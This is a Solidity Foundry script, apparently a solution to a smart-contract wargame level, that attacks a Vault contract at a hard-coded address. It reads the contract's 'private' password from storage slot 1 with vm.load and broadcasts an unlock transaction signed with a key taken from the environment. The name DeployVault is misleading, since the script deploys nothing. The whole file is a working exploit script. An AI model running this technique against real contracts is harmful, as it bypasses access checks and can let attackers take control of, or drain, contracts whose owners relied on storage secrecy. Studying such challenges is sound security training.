// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}

contract DeployVault is Script {
    address constant private TARGET_ADDRESS = 0x99a37F299B229492CF3f55219a05E2B0fD5141c6;
    IVault target;

    function run() public {
        target = IVault(TARGET_ADDRESS);
        bytes32 slotIndex = bytes32(uint256(1));
        bytes32 rawData = vm.load(address(target), slotIndex);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target.unlock(rawData);
        vm.stopBroadcast();
    }

}